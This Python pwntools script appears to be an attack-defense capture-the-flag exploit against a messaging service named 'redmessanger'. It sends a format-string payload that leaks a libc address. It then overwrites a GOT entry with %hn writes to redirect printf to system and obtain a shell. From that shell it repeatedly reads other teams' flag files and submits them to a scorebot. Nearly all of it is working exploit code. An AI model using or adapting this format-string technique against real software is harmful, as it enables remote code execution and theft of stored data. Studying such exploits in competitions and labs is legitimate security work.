from pwn import *
import requests
import sys
import struct
from array import *

sys.path.append('../utilities/')
from utils import sendFlag
from utils import getFlagID


INDEX0 = "\xb0\x42\x60\x00\x00\x00\x00\x00"
INDEX1 = "\xb2\x42\x60\x00\x00\x00\x00\x00"
INDEX2 = "\xb4\x42\x60\x00\x00\x00\x00\x00"
NULL = "\x00\x00\x00\x00\x00\x00\x00\x00"
INDEX = [INDEX0,INDEX1,INDEX2]

SCOREBOT_ADDR = "127.0.0.1"
SCOREBOT_PORT = "5000"
PORT = "20064"


hextodec = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']

def htd(c):
    return hextodec.index(c)

def exploit_clean(c):
    c.sendline("exit")
    print c.recvuntil(">>>")
    #raw_input()
    c.sendline("DELETE CGFR_1")
    print c.recvuntil(">>>")
    c.sendline("DELETE CGFR_0")
    print c.recvuntil(">>>")
    c.sendline("EXIT")
    c.close()


def exploit(c):

    payload = "%12$s678" + INDEX0

    #c = connect(ip, PORT)

    print c.recvuntil(">>>")
    c.sendline("NEW CGFR asd")
    print c.recvuntil(">>>")
    c.sendline("LOGIN CGFR asd")
    print c.recvuntil(">>>")
    c.sendline("SEND CGFR")
    print c.recvuntil("Subject:")
    c.sendline("DD")
    print c.recvuntil("<LF>.<LF>")
    c.sendline(payload)
    c.sendline(".")
    print c.recvuntil(">>>")
    c.sendline("READ CGFR_0")
    data = c.recvuntil(">>>")
    print(data)

    data = data.split("\n")[5]
    my_hex = data[0:6].encode("hex")
    print my_hex
    num = array('i',[0,0,0])
    for i in range(0,3):
        n = htd(my_hex[i*4])*16 + htd(my_hex[i*4+1]) + htd(my_hex[4*i+2])*16*16*16 + htd(my_hex[4*i+3])*16*16
        if(i == 0):
            n = n + 16*16*16*16
            n = n - 56752 #offset printf/system
        if(i == 1):
            n = n-1
        num[i] = n
        print("%d" % num[i])
    maximum = num.index(max(num))
    minimum = num.index(min(num))
    medium = 3 - maximum - minimum
    print("max %d med %d min %d" % (maximum,medium,minimum))
    payload = '%{0:05d}c%16$hn%{1:05d}c%18$hn%{2:05d}c%20$hn1'.format(num[minimum]-24,num[medium]-num[minimum],num[maximum]-num[medium])
    payload = payload + INDEX[minimum] + NULL + INDEX[medium] + NULL + INDEX[maximum]
    ll = len(payload)
    payload = payload + "#"*(256-len(payload)-24) + "sh" + "\x00"
    c.sendline("SEND CGFR")
    print c.recvuntil("Subject:")
    c.sendline("DD")
    print c.recvuntil("<LF>.<LF>")
    c.sendline(payload)
    c.sendline(".")
    print c.recvuntil(">>>")
    c.sendline("READ CGFR_1")
    print "mio " + c.recv(8192)

    #c.interactive()
    time.sleep(3)


    buf = ''

    while True:
        flag_id = getFlagID('redmessanger')
        buf = "cat messages/" + flag_id + "/" + flag_id + "_0"
        print buf
        c.sendline(buf)
        #time.sleep(3)
        #c.flush()
        c.recvuntil("flag")
        flag = c.recv(8192).splitlines()[2]
        print flag

        f = sendFlag(flag, 'redmessanger')
        print f
        #flag = c.recvline()
        #submitFlags
        #print flag
        time.sleep(12)
    #c.interactive()



if __name__=="__main__":
    try:
        if len(sys.argv) < 2:
    		print "Usage: %s <ip>" % sys.argv[0]
    		exit()
    	c=connect(sys.argv[1], PORT)
    	exploit(c)

    except(KeyboardInterrupt):
        exploit_clean(c)

        # print c.recvuntil(">>>")
        # raw_input()
        # c.sendline("DELETE AAAA_1")
        # print c.recvuntil(">>>")
        # c.sendline("DELETE AAAA_0")
        # print c.recvuntil(">>>")
